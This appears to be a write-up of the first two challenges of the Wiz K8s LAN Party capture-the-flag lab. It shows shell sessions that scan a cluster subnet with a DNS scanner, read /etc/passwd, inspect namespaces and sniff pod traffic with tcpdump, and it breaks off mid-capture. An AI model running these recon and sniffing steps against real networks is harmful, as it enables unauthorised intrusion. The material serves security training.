# K8s LAN Party Challenge

# K8s LAN PARTY

## Dive into a network full of miscongurations and exploit vulnerabilities with the goal of conquering a Kubernetes cluster


#### https://k8slanparty.com/

---


<img width="1380" height="859" alt="Screenshot 2025-09-01 at 2 55 52 PM" src="https://github.com/user-attachments/assets/16587dd1-1b28-4b40-960a-ce343551d555" />


---

## **RECON**


<img width="1379" height="859" alt="Screenshot 2025-09-01 at 2 56 48 PM" src="https://github.com/user-attachments/assets/7b17ad15-5ed8-45ce-a486-5beef81e4ff7" />

---

```bash
player@wiz-k8s-lan-party:~$ dnscan             
Usage: ./dnscan -subnet <CIDR or Wildcard>
player@wiz-k8s-lan-party:~$ cat /etc/resolv.conf 
search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal
nameserver 10.100.120.34
options ndots:5
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.*.*   
35041 / 65536 [------------------------------------------------------------------->___________________________________________________________] 53.47% 978 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.
65478 / 65536 [------------------------------------------------------------------------------------------------------------------------------>] 99.91% 971 p/s10.100.136.254 -> getflag-service.k8s-lan-party.svc.cluster.local.
player@wiz-k8s-lan-party:~$ curl 10.100.136.254
wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
player@wiz-k8s-lan-party:~$

```

---


## FINDING NEIGHBOURS



<img width="1299" height="786" alt="Screenshot 2025-09-01 at 3 01 02 PM" src="https://github.com/user-attachments/assets/658700d5-d383-42b3-8fbe-5f7ee78d7231" />

---

```bash
player@wiz-k8s-lan-party:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin
istio:x:1337:1337::/home/istio:/bin/sh
player:x:1001:1001::/home/player:/bin/sh
player@wiz-k8s-lan-party:~$ ls -la /proc/1/ns/
total 0
dr-x--x--x. 2 player player 0 Sep  1 09:43 .
dr-xr-xr-x. 9 player player 0 Sep  1 09:29 ..
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 cgroup -> 'cgroup:[4026551319]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 ipc -> 'ipc:[4026551316]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 mnt -> 'mnt:[4026551314]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 net -> 'net:[4026544176]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 pid -> 'pid:[4026551317]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 pid_for_children -> 'pid:[4026551317]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 time -> 'time:[4026531834]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 time_for_children -> 'time:[4026531834]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 user -> 'user:[4026531837]'
lrwxrwxrwx. 1 player player 0 Sep  1 09:43 uts -> 'uts:[4026551315]'
player@wiz-k8s-lan-party:~$ ls -la /proc/sys/net/
total 0
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 .
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 ..
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 core
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 ipv4
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 ipv6
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 mptcp
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 netfilter
dr-xr-xr-x. 1 root root 0 Sep  1 09:44 unix
player@wiz-k8s-lan-party:~$ lsns -t net
        NS TYPE NPROCS PID USER      NETNSID NSFS COMMAND
4026544176 net       2   1 player unassigned      /bin/bash
player@wiz-k8s-lan-party:~$ tcpdump
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ns-51cf51, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:47:56.607100 IP 192.168.2.135.36468 > 10.100.0.10.domain: 41783+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:47:56.607175 IP 192.168.2.135.36468 > 10.100.0.10.domain: 28212+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:47:56.608328 IP 10.100.0.10.domain > 192.168.2.135.36468: 41783*- 1/0/0 A 10.100.171.123 (132)
09:47:56.608357 IP 10.100.0.10.domain > 192.168.2.135.36468: 28212*- 0/1/0 (160)
09:47:56.608445 IP 192.168.2.135.37888 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 2080849628, win 64240, options [mss 1460,sackOK,TS val 2965324767 ecr 0,nop,wscale 7], length 0
09:47:56.608491 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.37888: Flags [S.], seq 2319414781, ack 2080849629, win 65160, options [mss 1460,sackOK,TS val 3705437769 ecr 2965324767,nop,wscale 7], length 0
09:47:56.608500 IP 192.168.2.135.37888 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965324767 ecr 3705437769], length 0
09:47:56.608600 IP 192.168.2.135.37888 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965324767 ecr 3705437769], length 214: HTTP: POST / HTTP/1.1
09:47:56.608619 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.37888: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705437769 ecr 2965324767], length 0
09:47:56.610450 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.37888: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705437771 ecr 2965324767], length 205: HTTP: HTTP/1.1 200 OK
09:47:56.610463 IP 192.168.2.135.37888 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965324769 ecr 3705437771], length 0
09:47:56.610648 IP 192.168.2.135.37888 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965324769 ecr 3705437771], length 0
09:47:56.610708 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.37888: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705437771 ecr 2965324769], length 0
09:47:56.610712 IP 192.168.2.135.37888 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965324769 ecr 3705437771], length 0
09:47:56.633241 IP 192.168.2.135.54007 > 10.100.60.37.domain: 22957+ PTR? 10.0.100.10.in-addr.arpa. (42)
09:47:56.635386 IP 10.100.60.37.domain > 192.168.2.135.54007: 22957 NXDomain 0/0/0 (42)
09:47:56.635502 IP 192.168.2.135.50583 > 10.100.60.37.domain: 23110+ PTR? 135.2.168.192.in-addr.arpa. (44)
09:47:56.637512 IP 10.100.60.37.domain > 192.168.2.135.50583: 23110 NXDomain 0/0/0 (44)
09:47:56.637672 IP 192.168.2.135.49458 > 10.100.60.37.domain: 17851+ PTR? 123.171.100.10.in-addr.arpa. (45)
09:47:56.637854 IP 10.100.60.37.domain > 192.168.2.135.49458: 17851*- 1/0/0 PTR reporting-service.k8s-lan-party.svc.cluster.local. (135)
09:47:56.743091 IP 192.168.2.135.54571 > 10.100.60.37.domain: 47648+ PTR? 37.60.100.10.in-addr.arpa. (43)
09:47:56.745076 IP 10.100.60.37.domain > 192.168.2.135.54571: 47648 NXDomain 0/0/0 (43)
09:48:01.620433 IP 192.168.2.135.53735 > 10.100.0.10.domain: 33136+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:01.620504 IP 192.168.2.135.53735 > 10.100.0.10.domain: 12914+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:01.621636 IP 10.100.0.10.domain > 192.168.2.135.53735: 33136*- 1/0/0 A 10.100.171.123 (132)
09:48:01.621665 IP 10.100.0.10.domain > 192.168.2.135.53735: 12914*- 0/1/0 (160)
09:48:01.621746 IP 192.168.2.135.59950 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 2576725247, win 64240, options [mss 1460,sackOK,TS val 2965329780 ecr 0,nop,wscale 7], length 0
09:48:01.621789 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59950: Flags [S.], seq 4121850857, ack 2576725248, win 65160, options [mss 1460,sackOK,TS val 3705442782 ecr 2965329780,nop,wscale 7], length 0
09:48:01.621798 IP 192.168.2.135.59950 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965329780 ecr 3705442782], length 0
09:48:01.621883 IP 192.168.2.135.59950 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965329780 ecr 3705442782], length 214: HTTP: POST / HTTP/1.1
09:48:01.621893 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59950: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705442782 ecr 2965329780], length 0
09:48:01.623590 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59950: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705442784 ecr 2965329780], length 205: HTTP: HTTP/1.1 200 OK
09:48:01.623601 IP 192.168.2.135.59950 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965329782 ecr 3705442784], length 0
09:48:01.623741 IP 192.168.2.135.59950 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965329782 ecr 3705442784], length 0
09:48:01.623778 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59950: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705442784 ecr 2965329782], length 0
09:48:01.623781 IP 192.168.2.135.59950 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965329782 ecr 3705442784], length 0
09:48:06.633352 IP 192.168.2.135.51630 > 10.100.0.10.domain: 13069+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:06.633408 IP 192.168.2.135.51630 > 10.100.0.10.domain: 26625+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:06.634550 IP 10.100.0.10.domain > 192.168.2.135.51630: 26625*- 0/1/0 (160)
09:48:06.634788 IP 10.100.0.10.domain > 192.168.2.135.51630: 13069*- 1/0/0 A 10.100.171.123 (132)
09:48:06.634865 IP 192.168.2.135.59960 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 415613115, win 64240, options [mss 1460,sackOK,TS val 2965334793 ecr 0,nop,wscale 7], length 0
09:48:06.634906 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59960: Flags [S.], seq 2233939286, ack 415613116, win 65160, options [mss 1460,sackOK,TS val 3705447795 ecr 2965334793,nop,wscale 7], length 0
09:48:06.634914 IP 192.168.2.135.59960 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965334793 ecr 3705447795], length 0
09:48:06.635012 IP 192.168.2.135.59960 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965334794 ecr 3705447795], length 214: HTTP: POST / HTTP/1.1
09:48:06.635030 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59960: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705447796 ecr 2965334794], length 0
09:48:06.636675 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59960: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705447797 ecr 2965334794], length 205: HTTP: HTTP/1.1 200 OK
09:48:06.636687 IP 192.168.2.135.59960 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965334795 ecr 3705447797], length 0
09:48:06.636832 IP 192.168.2.135.59960 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965334795 ecr 3705447797], length 0
09:48:06.636874 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.59960: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705447797 ecr 2965334795], length 0
09:48:06.636879 IP 192.168.2.135.59960 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965334795 ecr 3705447797], length 0
09:48:11.646441 IP 192.168.2.135.50463 > 10.100.0.10.domain: 39011+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:11.646515 IP 192.168.2.135.50463 > 10.100.0.10.domain: 20832+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:11.647569 IP 10.100.0.10.domain > 192.168.2.135.50463: 20832*- 0/1/0 (160)
09:48:11.647602 IP 10.100.0.10.domain > 192.168.2.135.50463: 39011*- 1/0/0 A 10.100.171.123 (132)
09:48:11.647692 IP 192.168.2.135.42920 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 3628407802, win 64240, options [mss 1460,sackOK,TS val 2965339806 ecr 0,nop,wscale 7], length 0
09:48:11.647730 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42920: Flags [S.], seq 2537494143, ack 3628407803, win 65160, options [mss 1460,sackOK,TS val 3705452808 ecr 2965339806,nop,wscale 7], length 0
09:48:11.647738 IP 192.168.2.135.42920 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965339806 ecr 3705452808], length 0
09:48:11.647823 IP 192.168.2.135.42920 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965339806 ecr 3705452808], length 214: HTTP: POST / HTTP/1.1
09:48:11.647835 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42920: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705452808 ecr 2965339806], length 0
09:48:11.649467 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42920: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705452810 ecr 2965339806], length 205: HTTP: HTTP/1.1 200 OK
09:48:11.649478 IP 192.168.2.135.42920 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965339808 ecr 3705452810], length 0
09:48:11.649621 IP 192.168.2.135.42920 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965339808 ecr 3705452810], length 0
09:48:11.649656 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42920: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705452810 ecr 2965339808], length 0
09:48:11.649659 IP 192.168.2.135.42920 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965339808 ecr 3705452810], length 0
09:48:16.659429 IP 192.168.2.135.48737 > 10.100.0.10.domain: 62677+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:16.659493 IP 192.168.2.135.48737 > 10.100.0.10.domain: 18903+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:16.660594 IP 10.100.0.10.domain > 192.168.2.135.48737: 18903*- 0/1/0 (160)
09:48:16.660702 IP 10.100.0.10.domain > 192.168.2.135.48737: 62677*- 1/0/0 A 10.100.171.123 (132)
09:48:16.660776 IP 192.168.2.135.42936 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 3491490235, win 64240, options [mss 1460,sackOK,TS val 2965344819 ecr 0,nop,wscale 7], length 0
09:48:16.660813 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42936: Flags [S.], seq 514030934, ack 3491490236, win 65160, options [mss 1460,sackOK,TS val 3705457821 ecr 2965344819,nop,wscale 7], length 0
09:48:16.660820 IP 192.168.2.135.42936 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965344819 ecr 3705457821], length 0
09:48:16.660902 IP 192.168.2.135.42936 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965344819 ecr 3705457821], length 214: HTTP: POST / HTTP/1.1
09:48:16.660913 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42936: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705457821 ecr 2965344819], length 0
09:48:16.662495 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42936: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705457823 ecr 2965344819], length 205: HTTP: HTTP/1.1 200 OK
09:48:16.662507 IP 192.168.2.135.42936 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965344821 ecr 3705457823], length 0
09:48:16.662641 IP 192.168.2.135.42936 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965344821 ecr 3705457823], length 0
09:48:16.662674 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.42936: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705457823 ecr 2965344821], length 0
09:48:16.662677 IP 192.168.2.135.42936 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965344821 ecr 3705457823], length 0
09:48:21.672035 IP 192.168.2.135.59607 > 10.100.0.10.domain: 29564+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:21.672107 IP 192.168.2.135.59607 > 10.100.0.10.domain: 51070+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:21.673210 IP 10.100.0.10.domain > 192.168.2.135.59607: 51070*- 0/1/0 (160)
09:48:21.673252 IP 10.100.0.10.domain > 192.168.2.135.59607: 29564*- 1/0/0 A 10.100.171.123 (132)
09:48:21.673339 IP 192.168.2.135.54636 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 3192106856, win 64240, options [mss 1460,sackOK,TS val 2965349832 ecr 0,nop,wscale 7], length 0
09:48:21.673367 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54636: Flags [S.], seq 517366659, ack 3192106857, win 65160, options [mss 1460,sackOK,TS val 3705462834 ecr 2965349832,nop,wscale 7], length 0
09:48:21.673374 IP 192.168.2.135.54636 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965349832 ecr 3705462834], length 0
09:48:21.673455 IP 192.168.2.135.54636 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965349832 ecr 3705462834], length 214: HTTP: POST / HTTP/1.1
09:48:21.673465 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54636: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705462834 ecr 2965349832], length 0
09:48:21.675103 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54636: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705462836 ecr 2965349832], length 205: HTTP: HTTP/1.1 200 OK
09:48:21.675114 IP 192.168.2.135.54636 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965349834 ecr 3705462836], length 0
09:48:21.675260 IP 192.168.2.135.54636 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965349834 ecr 3705462836], length 0
09:48:21.675296 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54636: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705462836 ecr 2965349834], length 0
09:48:21.675299 IP 192.168.2.135.54636 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965349834 ecr 3705462836], length 0
09:48:26.684815 IP 192.168.2.135.59538 > 10.100.0.10.domain: 35768+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:26.684893 IP 192.168.2.135.59538 > 10.100.0.10.domain: 49061+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:26.686066 IP 10.100.0.10.domain > 192.168.2.135.59538: 35768*- 1/0/0 A 10.100.171.123 (132)
09:48:26.686096 IP 10.100.0.10.domain > 192.168.2.135.59538: 49061*- 0/1/0 (160)
09:48:26.686176 IP 192.168.2.135.54648 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 409406681, win 64240, options [mss 1460,sackOK,TS val 2965354845 ecr 0,nop,wscale 7], length 0
09:48:26.686213 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54648: Flags [S.], seq 3672230631, ack 409406682, win 65160, options [mss 1460,sackOK,TS val 3705467847 ecr 2965354845,nop,wscale 7], length 0
09:48:26.686222 IP 192.168.2.135.54648 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965354845 ecr 3705467847], length 0
09:48:26.686325 IP 192.168.2.135.54648 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965354845 ecr 3705467847], length 214: HTTP: POST / HTTP/1.1
09:48:26.686343 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54648: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705467847 ecr 2965354845], length 0
09:48:26.688025 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54648: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705467849 ecr 2965354845], length 205: HTTP: HTTP/1.1 200 OK
09:48:26.688038 IP 192.168.2.135.54648 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965354847 ecr 3705467849], length 0
09:48:26.688185 IP 192.168.2.135.54648 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965354847 ecr 3705467849], length 0
09:48:26.688238 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.54648: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705467849 ecr 2965354847], length 0
09:48:26.688243 IP 192.168.2.135.54648 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965354847 ecr 3705467849], length 0
09:48:31.697933 IP 192.168.2.135.44199 > 10.100.0.10.domain: 24456+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:31.698008 IP 192.168.2.135.44199 > 10.100.0.10.domain: 64138+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
09:48:31.699127 IP 10.100.0.10.domain > 192.168.2.135.44199: 24456*- 1/0/0 A 10.100.171.123 (132)
09:48:31.699176 IP 10.100.0.10.domain > 192.168.2.135.44199: 64138*- 0/1/0 (160)
09:48:31.699260 IP 192.168.2.135.58928 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 2014002914, win 64240, options [mss 1460,sackOK,TS val 2965359858 ecr 0,nop,wscale 7], length 0
09:48:31.699306 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.58928: Flags [S.], seq 2192542524, ack 2014002915, win 65160, options [mss 1460,sackOK,TS val 3705472860 ecr 2965359858,nop,wscale 7], length 0
09:48:31.699315 IP 192.168.2.135.58928 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2965359858 ecr 3705472860], length 0
09:48:31.699401 IP 192.168.2.135.58928 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 2965359858 ecr 3705472860], length 214: HTTP: POST / HTTP/1.1
09:48:31.699413 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.58928: Flags [.], ack 215, win 508, options [nop,nop,TS val 3705472860 ecr 2965359858], length 0
09:48:31.701030 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.58928: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 3705472862 ecr 2965359858], length 205: HTTP: HTTP/1.1 200 OK
09:48:31.701042 IP 192.168.2.135.58928 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 2965359860 ecr 3705472862], length 0
09:48:31.701190 IP 192.168.2.135.58928 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 2965359860 ecr 3705472862], length 0
09:48:31.701225 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.2.135.58928: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 3705472862 ecr 2965359860], length 0
09:48:31.701228 IP 192.168.2.135.58928 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 207, win 501, options [nop,nop,TS val 2965359860 ecr 3705472862], length 0
^C
120 packets captured
120 packets received by filter
0 packets dropped by kernel
player@wiz-k8s-lan-party:~$ curl reporting-service.k8s-lan-party.svc.cluster.local.http:
curl: (3) URL using bad/illegal format or missing URL
player@wiz-k8s-lan-party:~$ curl reporting-service.k8s-lan-party.svc.cluster.local.http 
curl: (6) Could not resolve host: reporting-service.k8s-lan-party.svc.cluster.local.http
player@wiz-k8s-lan-party:~$ dig reporting-service.k8s-lan-party.svc.cluster.local.http 

; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> reporting-service.k8s-lan-party.svc.cluster.local.http
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 41089
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 99fadc71e32e9442 (echoed)
;; QUESTION SECTION:
;reporting-service.k8s-lan-party.svc.cluster.local.http.        IN A

;; AUTHORITY SECTION:
.                       9       IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2025090100 1800 900 604800 86400

;; Query time: 0 msec
;; SERVER: 10.100.60.37#53(10.100.60.37) (UDP)
;; WHEN: Mon Sep 01 09:49:16 UTC 2025
;; MSG SIZE  rcvd: 170

player@wiz-k8s-lan-party:~$ tcpdump -X
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ns-51cf51, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:54:22.607633 IP 192.168.2.135.52033 > 10.100.0.10.domain: 1038+ A? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f 42b5 4000 7f11 eb3b c0a8 0287  E.._B.@....;....
        0x0010:  0a64 000a cb41 0035 004b cdf9 040e 0100  .d...A.5.K......
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 0100 01    ster.local.....
09:54:22.607711 IP 192.168.2.135.52033 > 10.100.0.10.domain: 37389+ AAAA? reporting-service.k8s-lan-party.svc.cluster.local. (67)
        0x0000:  4500 005f 42b6 4000 7f11 eb3a c0a8 0287  E.._B.@....:....
        0x0010:  0a64 000a cb41 0035 004b cdf9 920d 0100  .d...A.5.K......
        0x0020:  0001 0000 0000 0000 1172 6570 6f72 7469  .........reporti
        0x0030:  6e67 2d73 6572 7669 6365 0d6b 3873 2d6c  ng-service.k8s-l
        0x0040:  616e 2d70 6172 7479 0373 7663 0763 6c75  an-party.svc.clu
        0x0050:  7374 6572 056c 6f63 616c 0000 1c00 01    ster.local.....
